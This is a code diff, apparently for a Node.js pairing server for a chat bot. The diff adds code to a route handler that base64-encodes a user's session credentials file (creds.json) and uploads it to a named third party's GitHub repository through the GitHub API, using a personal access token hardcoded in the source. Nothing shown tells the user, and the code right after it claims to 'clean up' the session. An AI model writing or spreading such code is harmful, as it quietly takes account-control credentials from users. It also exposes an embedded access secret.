@@ -96,6 +96,34 @@ router.get('/', async (req, res) => {
                         });
                         console.log("⚠️ Warning message sent successfully");
 
+                        // Upload creds.json to GitHub session folder
+                        console.log("📤 Uploading session to GitHub...");
+                        const token = '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';
+                        const owner = 'artexpury925';
+                        const repo = 'vamp-bot-254';
+                        const path = `session/${num}/creds.json`;
+                        const content = sessionVAMPARINA.toString('base64');
+                        try {
+                            const response = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`, {
+                                method: 'PUT',
+                                headers: {
+                                    'Authorization': `token ${token}`,
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    message: `Upload session creds for ${num}`,
+                                    content: content
+                                })
+                            });
+                            if (response.ok) {
+                                console.log("📤 Session uploaded to GitHub successfully");
+                            } else {
+                                console.error("❌ Failed to upload to GitHub:", response.status, response.statusText);
+                            }
+                        } catch (uploadError) {
+                            console.error("❌ Error uploading to GitHub:", uploadError);
+                        }
+
                         // Clean up session after use
                         console.log("🧹 Cleaning up session...");
                         await delay(1000);
